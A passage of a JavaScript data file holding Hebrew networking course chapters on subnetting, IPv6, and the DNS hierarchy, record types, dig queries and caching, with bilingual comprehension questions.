          <p><strong>כתובות מיוחדות נוספות:</strong></p>
          <ul>
            <li><code>127.0.0.0/8</code> — Loopback — 127.0.0.1 = localhost</li>
            <li><code>169.254.0.0/16</code> — <code>APIPA</code> — נוצרת אוטומטית כשאין שרת <code>DHCP</code> זמין</li>
            <li><code>0.0.0.0</code> — כל הכתובות — <code>bind</code> לכל ממשקים</li>
            <li><code>255.255.255.255</code> — <code>Limited Broadcast</code> — לכל ברשת המקומית</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "חישוב Subnetting – דוגמה מעשית",
        content: `
          <p>רשת <code>192.168.10.0/24</code> — 254 מארחים.</p>
          <p>רוצים לחלק ל-4 תת-רשתות שוות.</p>
          <p><strong>חישוב:</strong></p>
          <ul>
            <li>254 ÷ 4 = 63.5 → צריך לפחות 64 מארחים לכל רשת</li>
            <li>2^6 = 64 → צריך 6 ביטים ל-Host</li>
            <li>prefix = 32 − 6 = <strong>/26</strong></li>
          </ul>
          <table class="content-table">
            <tr><th>תת-רשת</th><th>טווח</th><th>Broadcast</th><th>מארחים</th></tr>
            <tr><td>192.168.10.0/26</td><td>.1 – .62</td><td>.63</td><td>62</td></tr>
            <tr><td>192.168.10.64/26</td><td>.65 – .126</td><td>.127</td><td>62</td></tr>
            <tr><td>192.168.10.128/26</td><td>.129 – .190</td><td>.191</td><td>62</td></tr>
            <tr><td>192.168.10.192/26</td><td>.193 – .254</td><td>.255</td><td>62</td></tr>
          </table>
          <p><strong>כלל מהיר:</strong> אם ה-prefix הוא <code>/26</code>, גודל הבלוק הוא 256÷4=64.</p>
          <p>כל תת-רשת מתחילה במכפלה של 64: 0, 64, 128, 192.</p>
          <p><strong>זיהוי השתייכות לרשת:</strong></p>
          <p>מבצעים <code>AND</code> לוגי של כתובת ה-IP עם ה-<code>Subnet Mask</code>.</p>
          <p>אם התוצאה שווה לכתובת הרשת — הכתובת שייכת לאותה רשת.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: Subnet בפייתון",
        content: `
          <p>מודול <code>ipaddress</code> בפייתון 3 עושה Subnetting בקלות:</p>
          <div class="code-preview">
            <pre><code>import ipaddress

# יצירת רשת
net = ipaddress.ip_network('192.168.1.0/24')
print(f"רשת: {net.network_address}")     # 192.168.1.0
print(f"Broadcast: {net.broadcast_address}")  # 192.168.1.255
print(f"מארחים: {net.num_addresses - 2}")  # 254

# בדיקה אם IP ברשת
ip = ipaddress.ip_address('192.168.1.50')
print(f"ב-רשת? {ip in net}")  # True

# חלוקה ל-4 תת-רשתות
for subnet in net.subnets(prefixlen_diff=2):
    print(f"{subnet} → {list(subnet.hosts())[0]} עד {list(subnet.hosts())[-1]}")

# supernet – ה-רשת הגדולה יותר
print(net.supernet())  # 192.168.0.0/23</code></pre>
          </div>
          <ul>
            <li><code>ipaddress</code> מכיל את המחלקות: <code>ip_network</code>, <code>ip_address</code>, <code>ip_interface</code></li>
            <li><code>subnets()</code> – מחלק לתת-רשתות</li>
            <li><code>supernet()</code> – מאחד לרשת גדולה יותר</li>
            <li><code>hosts()</code> – מחזיר את כל ה-IPs הניתנים להקצאה</li>
          </ul>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – Subnetting",
        intro: "<p>לדוגמאות ריאליות מהעולם:</p>",
        blocks: [
          {
            title: "ארכיטקטורת רשת של AWS",
            icon: "☁️",
            content: `
              <p>ב-<code>AWS</code>, שירות <code>VPC</code> — <code>Virtual Private Cloud</code> — הוא רשת וירטואלית פרטית שלך.</p>
              <p>בוחרים <code>CIDR</code> בסיסי, למשל <code>10.0.0.0/16</code> שנותן 65K כתובות. מתוכו יוצרים תת-רשתות:</p>
              <ul>
                <li><strong>Public Subnets</strong> — <code>10.0.1.0/24</code>, <code>10.0.2.0/24</code> — יש להן גישה לאינטרנט</li>
                <li><strong>Private Subnets</strong> — <code>10.0.10.0/24</code>, <code>10.0.11.0/24</code> — ללא גישה ישירה</li>
              </ul>
              <p><code>Subnetting</code> מגדיר את הארכיטקטורה של הענן.</p>
            `
          },
          {
            title: "האם 192.168.1.1 תמיד הנתב?",
            icon: "🤔",
            content: `
              <p>לא! <code>192.168.1.1</code> הוא כתובת Default Gateway של הנתב — אבל זו רק מוסכמה.</p>
              <p>הנתב יכול להיות <code>192.168.1.254</code>, <code>10.0.0.1</code>, או כל כתובת שהוגדרה.</p>
              <p>ראוטרים ביתיים בחרו <code>192.168.1.1</code> כברירת מחדל מנוחות — וזה הפך למוסכמה.</p>
              <p>אפשר לראות את הנתב האמיתי ב-<code>ipconfig</code> תחת "Default Gateway".</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 17",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Subnetting</code> = חלוקת רשת גדולה לרשתות קטנות. <code>IP</code> = חלק רשת + חלק מארח</li>
              <li><code>CIDR</code> /prefix: /24 = 254 מארחים, /25 = 126, /30 = 2. כתובות = 2 בחזקת 32 פחות prefix, פחות 2</li>
              <li>כתובות פרטיות: 10.x.x.x, 172.16-31.x.x, 192.168.x.x – לא ניתנות לניתוב</li>
              <li>127.0.0.1 = <code>loopback</code>. 0.0.0.0 = כל ממשקים. 255.255.255.255 = <code>Broadcast</code></li>
              <li>חישוב: prefix /26 = block size 64. כל תת-רשת מתחילה במכפלה של block size</li>
              <li>Python: import ipaddress – ip_network, subnets(), hosts()</li>
            </ul>
          </div>
        `
      },
      { type: "simulation", title: "מחשבון Subnet", simId: "subnetCalc", content: "<p>הכניסו כתובת IP ומסכה — וראו את חלוקת הרשת.</p>" },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 17",
        titleEn: "Chapter 17 — Comprehension Questions",
        questions: [
          {
            q: "כמה מארחים יש ברשת 10.0.0.0/20?",
            a: "/20 = 32-20 = 12 ביטים למארחים. 2^12 = 4096 כתובות. מארחים = 4096 - 2 = 4094 (מוחסרים כתובת רשת ו-broadcast). הטווח: 10.0.0.1 עד 10.0.15.254.",
            qEn: "How many hosts are in the network 10.0.0.0/20?",
            aEn: "/20 means 32-20 = 12 bits for hosts. 2^12 = 4096 addresses. Hosts = 4096 - 2 = 4094 (minus network address and broadcast). Range: 10.0.0.1 to 10.0.15.254."
          },
          {
            q: "מה ההבדל בין כתובת פרטית לציבורית?",
            a: "כתובת פרטית (10.x.x.x, 172.16-31.x.x, 192.168.x.x) – לא ניתנת לניתוב באינטרנט. כתובת ציבורית – ניתנת לניתוב, ייחודית בעולם. NAT מאפשר למחשבים עם IP פרטי לגשת לאינטרנט דרך IP ציבורי אחד.",
            qEn: "What is the difference between a private and a public address?",
            aEn: "A private address (10.x.x.x, 172.16-31.x.x, 192.168.x.x) cannot be routed on the Internet. A public address can be routed and is unique in the world. NAT allows computers with private IPs to access the Internet through one public IP."
          },
          {
            q: "למה /30 משמש לקישורים בין נתבים?",
            a: "/30 = 4 כתובות, 2 מארחים. בקישור P2P בין שני נתבים צריך בדיוק 2 כתובות. /30 חוסך כתובות – /24 לקישור כזה יהיה בזבוז של 252 כתובות.",
            qEn: "Why is /30 used for links between routers?",
            aEn: "/30 gives 4 addresses, 2 usable hosts. A point-to-point link between two routers needs exactly 2 addresses. /30 saves addresses — using /24 for such a link would waste 252 addresses."
          }
        ]
      }
    ]
  },
  {
    id: 18,
    title: "IPv6 – גרסת האינטרנט החדשה",
    pages: [
      {
        type: "explanation",
        title: "למה IPv6?",
        content: `
          <p><strong><code>IPv4</code> כמעט נגמר.</strong> 4.3 מיליארד כתובות נשמעו הרבה ב-1981.</p>
          <p>אבל האינטרנט גדל לכל מכשיר: טלפון, רכב, מצלמת אבטחה, מקרר חכם.</p>
          <p><code>IANA</code> הקצתה את בלוק ה-<code>IPv4</code> האחרון ב-<strong>2011</strong>.</p>
          <p><strong><code>IPv6</code></strong> נוצר לפתרון הבעיה.</p>
          <p>128 ביטים = <strong>2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup></strong> כתובות.</p>
          <p>מספיק לתת לכל גרגר חול על כדור הארץ כמה מיליארד כתובות.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="15" width="130" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="75" y="38" text-anchor="middle" font-size="11" fill="var(--text)">IPv4</text>
              <text x="75" y="54" text-anchor="middle" font-size="10" fill="var(--text-muted)">32 ביטים</text>
              <text x="75" y="68" text-anchor="middle" font-size="9" fill="var(--text-muted)">~4.3 מיליארד</text>
              <rect x="200" y="15" width="130" height="50" rx="6" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.8"/>
              <text x="265" y="38" text-anchor="middle" font-size="11" fill="white">IPv6</text>
              <text x="265" y="54" text-anchor="middle" font-size="10" fill="white">128 ביטים</text>
              <text x="265" y="68" text-anchor="middle" font-size="9" fill="white">3.4 × 10³⁸</text>
            </svg>
          </div>
          <p>ב-2024, כ-<strong>46%</strong> מהגלישה בגוגל כבר ב-<code>IPv6</code>.</p>
          <p>מפעיליות כמו T-Mobile ו-Comcast כבר משתמשות ב-<code>IPv6</code> כברירת מחדל.</p>
        `
      },
      {
        type: "explanation",
        title: "פורמט כתובת IPv6",
        content: `
          <p>כתובת <code>IPv6</code> = <strong>8 קבוצות של 4 ספרות הקסדצימליות</strong>, מופרדות ב-<code>:</code>.</p>
          <div class="code-preview">
            <pre><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></pre>
          </div>
          <p><strong>כללי קיצור:</strong></p>
          <ul>
            <li>אפסים מובילים בכל קבוצה ניתן להשמיט: <code>0db8</code> → <code>db8</code></li>
            <li>קבוצות אפסים רצופות ניתן להחליף ב-<code>::</code> — פעם אחת בלבד בכתובת</li>
          </ul>
          <div class="code-preview">
            <pre><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334
↓ קיצור
2001:db8:85a3::8a2e:370:7334</code></pre>
          </div>
          <p><strong>כתובות מיוחדות:</strong></p>
          <table class="content-table">
            <tr><th>כתובת</th><th>IPv4 מקביל</th><th>משמעות</th></tr>
            <tr><td><code>::1</code></td><td>127.0.0.1</td><td><code>Loopback</code></td></tr>
            <tr><td><code>::</code></td><td>0.0.0.0</td><td>כל הממשקים / לא מוגדר</td></tr>
            <tr><td><code>fe80::/10</code></td><td>169.254.x.x</td><td><code>Link-Local</code> – ממשק מקומי בלבד</td></tr>
            <tr><td><code>ff02::1</code></td><td>255.255.255.255</td><td><code>Multicast</code> – כל הצמתים</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "סוגי כתובות IPv6",
        content: `
          <table class="content-table">
            <tr><th>סוג</th><th>Prefix</th><th>תיאור</th></tr>
            <tr><td><strong><code>Global Unicast</code></strong></td><td>2000::/3</td><td>ניתן לניתוב – כמו IPv4 ציבורי</td></tr>
            <tr><td><strong><code>Link-Local</code></strong></td><td>fe80::/10</td><td>אוטומטי על כל ממשק; לא ניתב</td></tr>
            <tr><td><strong><code>Unique Local</code></strong></td><td>fc00::/7</td><td>כמו RFC 1918 – פרטי, לא ניתב</td></tr>
            <tr><td><strong><code>Loopback</code></strong></td><td>::1/128</td><td>localhost</td></tr>
            <tr><td><strong><code>Multicast</code></strong></td><td>ff00::/8</td><td>אחד-לרבים. מחליף Broadcast</td></tr>
            <tr><td><strong><code>Anycast</code></strong></td><td>מ-unicast</td><td>אותה כתובת לכמה שרתים – הקרוב מנצח</td></tr>
          </table>
          <p><strong>אין <code>Broadcast</code> ב-<code>IPv6</code>!</strong></p>
          <p>שידורי <code>Broadcast</code> הוחלפו ב-<code>Multicast</code> ממוקד:</p>
          <ul>
            <li><code>ff02::1</code> – כל הצמתים ברשת המקומית</li>
            <li><code>ff02::2</code> – כל הנתבים ברשת המקומית</li>
          </ul>
          <p><strong><code>Link-Local</code></strong> – כתובת שנוצרת אוטומטית על כל ממשק רשת.</p>
          <p>מחושבת מכתובת ה-<code>MAC</code> בשיטת <code>EUI-64</code>.</p>
          <p>שימושית לפרוטוקול <code>NDP</code> ולגילוי נתבים — ללא צורך בשרת <code>DHCP</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "Header IPv6 – פשוט ומהיר יותר",
        content: `
          <p>IPv6 Header = <strong>40 בתים קבוע</strong>, בניגוד ל-IPv4 שהוא 20–60 בתים משתנה.</p>
          <p>Header פשוט יותר מאפשר לנתבים לעבד חבילות מהר יותר.</p>
          <p><strong>שינויים עיקריים ב-IPv6 Header:</strong></p>
          <ul>
            <li><strong>אין Checksum</strong> — מוריד עומס מנתבים. <code>TCP</code>/<code>UDP</code> כבר בודקים</li>
            <li><strong>אין Fragmentation בנתבים</strong> – רק המקור מפצל. נתבים מחזירים <code>ICMPv6</code> <code>"Packet Too Big"</code> אם החבילה גדולה מדי</li>
            <li><strong>Flow Label</strong> — שדה 20-bit לזיהוי זרם תעבורה — <code>QoS</code>, <code>load balancing</code></li>
            <li><strong><code>Hop Limit</code></strong> – כמו <code>TTL</code>, מפחית ב-1 בכל hop</li>
            <li><strong><code>Extension Headers</code></strong> – אפשרויות הועברו ל-headers נוספים מחוץ ל-header הבסיסי</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "NDP – מחליף ARP",
        content: `
          <p><strong>NDP</strong> — <code>Neighbor Discovery Protocol</code></p>
          <p>מחליף את <code>ARP</code> לגמרי ב-<code>IPv6</code>.</p>
          <p>עובד דרך <strong>ICMPv6</strong> ו-<code>Multicast</code> — לא <code>Broadcast</code>.</p>
          <p><strong>הודעות NDP עיקריות:</strong></p>
          <table class="content-table">
            <tr><th>הודעה</th><th>כמו ב-IPv4</th><th>תפקיד</th></tr>
            <tr><td><code>Router Solicitation</code> — <code>RS</code></td><td><code>DHCP Discover</code></td><td>מחשב שואל "יש נתב?"</td></tr>
            <tr><td><code>Router Advertisement</code> — <code>RA</code></td><td><code>DHCP Offer</code></td><td>נתב מכריז prefix, gateway, MTU</td></tr>
            <tr><td><code>Neighbor Solicitation</code> — <code>NS</code></td><td><code>ARP Request</code></td><td>"מי מחזיק כתובת X?"</td></tr>
            <tr><td><code>Neighbor Advertisement</code> — <code>NA</code></td><td><code>ARP Reply</code></td><td>"אני! הנה ה-MAC שלי"</td></tr>
          </table>
          <p><strong><code>SLAAC</code></strong> — <code>Stateless Address Autoconfiguration</code></p>
          <p>מחשב יכול לקבוע לעצמו כתובת <code>IPv6</code> ציבורית, <em>ללא DHCP</em>.</p>
          <p><strong>שלבי SLAAC:</strong></p>
          <ol>
            <li>נתב שולח <code>RA</code> עם prefix, למשל <code>2001:db8::/64</code></li>
            <li>מחשב לוקח את ה-prefix ומחשב suffix מה-<code>MAC</code> בשיטת <code>EUI-64</code></li>
            <li>כתובת מלאה נוצרת: <code>2001:db8::d4be:d9ff:fed6:0c2a</code></li>
          </ol>
          <p><strong>בעיית פרטיות:</strong> <code>SLAAC</code> מבוסס על כתובת <code>MAC</code> קבועה — ניתן לעקוב אחרי מכשירים.</p>
          <p><strong>הפתרון:</strong> <code>Privacy Extensions</code> — <code>RFC 4941</code> — יוצרות סיומת אקראית שמשתנה מדי פעם.</p>
        `
      },
      {
        type: "explanation",
        title: "Dual-Stack ומנגנוני מעבר",
        content: `
          <p>העולם לא עבר ל-<code>IPv6</code> ביום אחד. קיימים מנגנוני מעבר שמאפשרים שילוב של שתי הגרסאות.</p>
          <p><strong>Dual-Stack</strong> — הגישה המועדפת.</p>
          <p>המחשב או הנתב מריץ <code>IPv4</code> ו-<code>IPv6</code> במקביל.</p>
          <p>כשיש תמיכה ב-<code>IPv6</code> — הוא משמש. כשאין — המערכת חוזרת ל-<code>IPv4</code>.</p>
          <p>כך עובדות רוב הרשתות היום.</p>
          <p><strong>Tunneling</strong> – IPv6 בתוך IPv4:</p>
          <ul>
            <li><strong><code>6in4</code></strong> – כמוס IPv6 ב-IPv4 Protocol 41. דורש tunnel broker</li>
            <li><strong><code>Teredo</code></strong> – <code>IPv6</code> מעל <code>UDP</code>. עובד דרך <code>NAT</code>. בשימוש ב-<code>Windows</code></li>
          </ul>
          <p><strong><code>NAT64</code> + <code>DNS64</code></strong> – מאפשר מכשירי IPv6-only לתקשר עם שרתים IPv4-only:</p>
          <ul>
            <li><code>DNS64</code> יוצר <code>AAAA record</code> סינתטי מה-<code>A record</code>: <code>64:ff9b::93.184.216.34</code></li>
            <li><code>NAT64 gateway</code> מתרגם חבילות IPv6 ↔ IPv4 בפועל</li>
          </ul>
          <p>נפוץ ברשתות סלולריות: iPhone-ים ב-T-Mobile עובדים ב-IPv6-only עם NAT64 לגישה לאתרים ישנים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – IPv6",
        intro: "<p>השלכות מרחיקות לכת של 2^128 כתובות:</p>",
        blocks: [
          {
            title: "אם לכל מכשיר יש IP ציבורי – מה עם אבטחה?",
            icon: "🛡️",
            content: `
              <p><strong>ב-IPv4:</strong> <code>NAT</code> סיפק הגנה בחינם — מחשב ברשת פרטית לא היה נגיש מבחוץ.</p>
              <p><strong>ב-IPv6:</strong> כל מכשיר יכול לקבל IP ציבורי ולהיות נגיש ישירות מהאינטרנט. <code>Firewall</code> חיוני יותר מאי פעם.</p>
              <p><strong>היתרון:</strong> <code>NAT</code> יצר בעיות רבות בחיבורים ישירים כמו <code>P2P</code>, <code>VoIP</code> ומשחקים. ב-<code>IPv6</code>, חיבורים ישירים חוזרים לעבוד כמו שצריך.</p>
            `
          },
          {
            title: "IoT ו-IPv6 – כמה מכשירים?",
            icon: "🌐",
            content: `
              <p>ב-2030 צפויים <strong>50 מיליארד</strong> מכשירי <code>IoT</code>.</p>
              <p><strong>ב-IPv4:</strong> כל המכשירים חייבים לעבור דרך <code>NAT</code>, מה שיוצר סיבוכים רבים.</p>
              <p><strong>ב-IPv6:</strong> כל חיישן, נורה חכמה ורכב אוטונומי יקבל כתובת IP ייחודית גלובלית. ניהול, עדכון ואיתור תקלות הופכים ישירים ופשוטים.</p>
              <p><code>IPv6</code> הוא התשתית שמאפשרת את עתיד ה-<code>IoT</code>.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 18",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>IPv6</code> = 128 ביטים, 2<sup>128</sup> כתובות. כתיבה: 8 קבוצות hex מופרדות ב-:</li>
              <li>קיצורים: השמטת אפסים מובילים, :: לקבוצות אפסים רצופות</li>
              <li>סוגים: <code>Global Unicast</code>, <code>Link-Local</code> — fe80::, <code>Unique Local</code>, <code>Multicast</code> — ff00::. אין <code>Broadcast</code>!</li>
              <li><code>Header</code> קבוע 40B. אין <code>checksum</code>. אין <code>fragmentation</code> בנתבים. <code>Flow Label</code></li>
              <li><code>NDP</code> מחליף <code>ARP</code> — <code>Multicast</code>, לא <code>Broadcast</code>. <code>SLAAC</code> — <code>IP</code> אוטומטי ללא <code>DHCP</code></li>
              <li><code>Dual-Stack</code> = <code>IPv4</code>+<code>IPv6</code> במקביל. <code>NAT64</code>+<code>DNS64</code> = <code>IPv6</code>-only ↔ <code>IPv4</code></li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 18",
        titleEn: "Chapter 18 — Comprehension Questions",
        questions: [
          {
            q: "מה ייצוג קצר של 2001:0db8:0000:0000:0000:0000:1234:5678?",
            a: "2001:db8::1234:5678. כללים: מוחקים אפסים מובילים (0db8 → db8, 1234 נשאר). קבוצות האפסים הרצופות (:0000:0000:0000:0000:) מוחלפות פעם אחת ב-::.",
            qEn: "What is the short form of 2001:0db8:0000:0000:0000:0000:1234:5678?",
            aEn: "2001:db8::1234:5678. Rules: remove leading zeros (0db8 becomes db8). Consecutive groups of zeros (:0000:0000:0000:0000:) are replaced once with ::."
          },
          {
            q: "מה SLAAC ולמה הוא שימושי?",
            a: "SLAAC מאפשר למחשב לבנות כתובת IPv6 בעצמו מתוך prefix שהנתב מכריז + suffix מה-MAC. אין צורך ב-DHCP server. כל מכשיר שמתחבר לרשת מקבל כתובת אוטומטית. פשוט, מהיר, ומתאים ל-IoT.",
            qEn: "What is SLAAC and why is it useful?",
            aEn: "SLAAC lets a computer build its own IPv6 address from the prefix announced by the router plus a suffix from the MAC address. No DHCP server is needed. Every device that connects to the network gets an address automatically. Simple, fast, and good for IoT."
          },
          {
            q: "למה IPv6 לא צריך NAT?",
            a: "NAT קיים ב-IPv4 כי נגמרו הכתובות – צריך לשתף IP אחד בין הרבה מכשירים. IPv6 יש מספיק כתובות לכל מכשיר ב-IP ציבורי ייחודי. אין צורך לתרגם כתובות. כל מכשיר מתקשר ישירות.",
            qEn: "Why does IPv6 not need NAT?",
            aEn: "NAT exists in IPv4 because addresses ran out — many devices must share one IP. IPv6 has enough addresses for every device to have its own unique public IP. No need to translate addresses. Every device communicates directly."
          }
        ]
      }
    ]
  },
  {
    id: 19,
    title: "DNS בעומק – היררכיה, Records, ו-DoH",
    pages: [
      {
        type: "explanation",
        title: "היררכיית DNS",
        content: `
          <p>ה-<code>DNS</code> הוא מסד נתונים <strong>מבוזר והיררכי</strong> — אין שרת אחד שיודע הכל.</p>
          <p>המערכת בנויה משלוש רמות:</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 160" class="content-diagram">
              <rect x="110" y="5" width="120" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="24" text-anchor="middle" font-size="11" fill="var(--text)">Root Nameservers (13)</text>
              <line x1="170" y1="35" x2="170" y2="55"/>
              <rect x="60" y="55" width="220" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="74" text-anchor="middle" font-size="11" fill="var(--text)">TLD Nameservers (.com, .net, .org)</text>
              <line x1="170" y1="85" x2="170" y2="105"/>
              <rect x="60" y="105" width="220" height="30" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.7"/>
              <text x="170" y="124" text-anchor="middle" font-size="11" fill="white">Authoritative Nameservers</text>
              <text x="170" y="145" text-anchor="middle" font-size="9" fill="var(--text-muted)">(ns1.example.com – רשומות אמיתיות)</text>
              <line x1="60" y1="35" x2="60" y2="55" stroke="var(--text-muted)" stroke-dasharray="3,3"/>
              <line x1="280" y1="35" x2="280" y2="55" stroke="var(--text-muted)" stroke-dasharray="3,3"/>
            </svg>
          </div>
          <p><strong><code>Root Nameservers</code></strong> — 13 כתובות לוגיות — A עד M.</p>
          <p>מופעלות על ידי 12 ארגונים שונים.</p>
          <p>כל כתובת מגובה על ידי מאות שרתים פיזיים ברחבי העולם, באמצעות <code>Anycast</code>.</p>
          <p>שרתי ה-Root לא יודעים כתובות סופיות — רק לאיזה שרת <code>TLD</code> לפנות.</p>
          <p><strong><code>TLD Nameservers</code></strong> – אחראיים על סיומת הדומיין.</p>
          <p>לדוגמה: <code>.com</code> מנוהל על ידי <code>Verisign</code>, ו-<code>.org</code> על ידי <code>PIR</code>.</p>
          <p>שרתי ה-<code>TLD</code> יודעים מי השרת ה-<code>Authoritative</code> לכל דומיין תחתיהם.</p>
          <p><strong><code>Authoritative Nameservers</code></strong> – המקור האמיתי לדומיין.</p>
          <p>מחזיקים את הרשומות האמיתיות. תשובתם סופית ואינה דורשת הפניה נוספת.</p>
        `
      },
      {
        type: "explanation",
        title: "Recursive Resolution – כיצד DNS עובד צעד-צעד",
        content: `
          <p>כשהדפדפן מחפש <code>www.example.com</code>, תהליך ה-resolution עובר את השלבים הבאים:</p>
          <div class="demo-flow">
            <ol class="demo-steps">
              <li><strong>Cache מקומי</strong> – ה-OS בודק ב-cache מקומי ובקובץ <code>/etc/hosts</code>. אם יש תשובה — מחזיר מיד</li>
              <li><strong>Recursive Resolver</strong> — בדרך כלל שרת ה-DNS של הספק או הארגון — כגון <code>1.1.1.1</code> של Cloudflare, <code>8.8.8.8</code> של Google. גם הוא בודק cache</li>
              <li><strong>Root Query</strong> – Resolver שואל Root: "מי מטפל ב-<code>.com</code>?"</li>
              <li><strong>TLD Query</strong> – Root מחזיר כתובת TLD. Resolver שואל TLD: "מי מטפל ב-<code>example.com</code>?"</li>
              <li><strong>Authoritative Query</strong> – TLD מחזיר Authoritative. Resolver שואל: "מה ה-IP של <code>www.example.com</code>?"</li>
              <li><strong>תשובה + Cache</strong> – <code>Authoritative</code> מחזיר <code>A record</code>. <code>Resolver</code> שומר ב-cache לפי <code>TTL</code> ומעביר ללקוח</li>
            </ol>
          </div>
          <p>שלבים 3–5 קורים בדרך כלל תוך ~50ms. עם cache — ~1ms.</p>
          <p><strong>שאלה ל-Root היא נדירה מאוד</strong> — כולם נשמרים ב-cache. Resolver ממוצע שולח שאלת Root פחות מפעם ביום.</p>
        `
      },
      {
        type: "explanation",
        title: "סוגי Records – טבלה מלאה",
        content: `
          <table class="content-table">
            <tr><th>Record</th><th>תפקיד</th><th>דוגמה</th></tr>
            <tr><td><strong>A</strong></td><td>שם → IPv4</td><td>example.com → 93.184.216.34</td></tr>
            <tr><td><strong>AAAA</strong></td><td>שם → IPv6</td><td>example.com → 2606:2800:220::1</td></tr>
            <tr><td><strong>CNAME</strong></td><td>Alias (שם → שם)</td><td>www.example.com → example.com</td></tr>
            <tr><td><strong>MX</strong></td><td>שרת Mail + עדיפות</td><td>example.com MX 10 mail.example.com</td></tr>
            <tr><td><strong>TXT</strong></td><td>טקסט חופשי – SPF, DKIM, אימות</td><td>"v=spf1 include:_spf.google.com ~all"</td></tr>
            <tr><td><strong>NS</strong></td><td>Nameservers מוסמכים לזון</td><td>example.com NS ns1.cloudflare.com</td></tr>
            <tr><td><strong>PTR</strong></td><td>IP → שם — Reverse DNS</td><td>34.216.184.93.in-addr.arpa → example.com</td></tr>
            <tr><td><strong>SOA</strong></td><td>Start of Authority – מטא-נתוני הזון</td><td>Serial, Refresh, Retry, Expire, Min-TTL</td></tr>
            <tr><td><strong>SRV</strong></td><td>שירות מסוים – host:port</td><td>_sip._tcp.example.com → 5060 sip.example.com</td></tr>
            <tr><td><strong>CAA</strong></td><td>איזה CA רשאי להנפיק אישור?</td><td>example.com CAA 0 issue "letsencrypt.org"</td></tr>
          </table>
          <p><strong>מגבלת CNAME:</strong> רשומת <code>CNAME</code> לא יכולה לשמש על דומיין ראשי — <code>apex</code>.</p>
          <p>לדוגמה, <code>example.com</code> חייב להיות רשומת <code>A</code>, לא <code>CNAME</code>.</p>
          <p>זו הסיבה שאתרים רבים משתמשים ב-<code>www.example.com</code> כ-<code>CNAME</code>.</p>
          <p><strong>עדיפות MX:</strong> מספר נמוך יותר = עדיפות גבוהה יותר.</p>
          <p>אם יש כמה רשומות <code>MX</code>, הדואר ינסה קודם את השרת עם המספר הנמוך ביותר.</p>
          <p>לשרת גיבוי מגדירים מספר גבוה יותר, למשל <code>MX 20</code>.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: dig – שאילתות DNS מתקדמות",
        content: `
          <p><code>dig</code> הוא הכלי המקצועי לשאילתות DNS.</p>
          <p>נפוץ ב-<code>Linux</code> ו-<code>Mac</code>:</p>
          <div class="code-preview">
            <pre><code># שאילתת A record
$ dig www.google.com
;; ANSWER SECTION:
www.google.com.   300   IN   A   142.250.185.46

# שאילתת MX – מיל
$ dig google.com MX
google.com.   300   IN   MX   10 smtp.google.com.

# שאילתת TXT – SPF
$ dig google.com TXT
google.com.   300   IN   TXT "v=spf1 include:_spf.google.com ~all"

# Reverse DNS
$ dig -x 8.8.8.8
8.8.8.8.in-addr.arpa. IN PTR dns.google.

# שאילתה ישירות לשרת authoritative
$ dig @8.8.8.8 example.com A

# מסלול DNS מלא (trace)
$ dig +trace www.example.com</code></pre>
          </div>
          <ul>
            <li><code>dig +trace</code> מראה את כל שלבי ה-resolution: Root → TLD → Authoritative</li>
            <li>שימושי לאיבחון בעיות <code>DNS</code> ולהבנת המסלול המלא של שאילתה</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "DNS Caching ו-TTL",
        content: `
          <p>כל record DNS מכיל <strong><code>TTL</code></strong> — <code>Time To Live</code> — בשניות.</p>
          <p>קובע כמה זמן ה-resolver שומר ב-cache.</p>
          <p><strong>TTL נמוך</strong> — 300 שניות = 5 דקות:</p>
          <ul>
            <li>שינויים מתפשטים מהר</li>
            <li>הרבה שאילתות — עומס על ה-Authoritative</li>
          </ul>
          <p><strong>TTL גבוה</strong> — 86,400 שניות = 24 שעות:</p>
          <ul>
            <li>ביצועים טובים, מעט שאילתות</li>
            <li>שינויים לוקחים זמן להתפשט</li>
          </ul>
          <p><strong>Negative Caching</strong></p>
          <p>גם תשובות שליליות — <code>NXDOMAIN</code> — נשמרות ב-<code>cache</code>, לפי ה-<code>TTL</code> המינימלי ברשומת ה-<code>SOA</code>.</p>
          <p>מנגנון זה מונע הצפה של שרתי <code>DNS</code> בשאילתות חוזרות לדומיינים שגויים.</p>
          <p><strong>שכבות cache:</strong></p>
          <ol>
            <li>Cache של הדפדפן — ב-Chrome: <code>chrome://net-internals/#dns</code></li>
            <li>Cache של מערכת ההפעלה</li>
            <li>Cache של ה-Recursive Resolver — ISP או <code>1.1.1.1</code></li>
          </ol>
          <p>כלים לניקוי cache:</p>
          <div class="code-preview">
            <pre><code># Windows
ipconfig /flushdns

# Linux (systemd-resolved)
sudo systemd-resolve --flush-caches

# macOS
sudo dscacheutil -flushcache</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "DNS over HTTPS — DoH ו-DNS over TLS — DoT",
        content: `
          <p><code>DNS</code> מסורתי עובד על <code>UDP</code> פורט 53 ומועבר כטקסט גלוי.</p>
